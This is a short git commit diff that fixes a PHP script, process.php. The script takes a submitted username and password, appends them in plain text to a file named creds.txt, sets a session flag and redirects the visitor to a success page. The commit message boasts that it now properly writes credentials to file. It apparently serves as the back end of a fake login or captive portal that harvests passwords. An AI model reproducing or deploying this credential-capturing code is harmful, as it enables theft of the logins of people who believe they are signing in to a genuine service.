c707c1b1fea8ab59369291dc7559cb8859caa0cf
vidkun <vidkun.torvald@gmail.com>
2012-11-18 13:20:38 -0600

    fixed process.php
    process.php is now working. Properly writes credentials to file and
    builds session

--- process.php
+++ process.php
@@ -1,28 +1,27 @@
 <?php 
-if (isset ($_POST('submit'))) {
+if (isset ($_POST['submit'])) {
 
 $user = $_POST['auth_user'];
 $pass = $_POST['auth_pass'];
-$border = "==================================";
+$border = "==================================\n";
 $creds = 'creds.txt';
 
 if (is_writeable($creds)) {
 	$creds_handle = fopen($creds, 'a') or die("Can't open file");
 	fwrite($creds_handle, $border);
 	fwrite($creds_handle, $user);
+	fwrite($creds_handle, "\n");
 	fwrite($creds_handle, $pass);
+	fwrite($creds_handle, "\n");
 	fwrite($creds_handle, $border);
 }
 fclose($creds_handle);
-
 session_start();
-$_SESSION['valid'] = 1;
+$_SESSION['valid'] = '1';
 $host  = $_SERVER['HTTP_HOST'];
 $uri   = rtrim(dirname($_SERVER['PHP_SELF']), '/\\');
 $extra = 'success.html';
 header("Location: http://$host$uri/$extra");
 }
-else {
-	die("Form submit failed");
-}
+else { die("Form submit failed"); }
 ?>
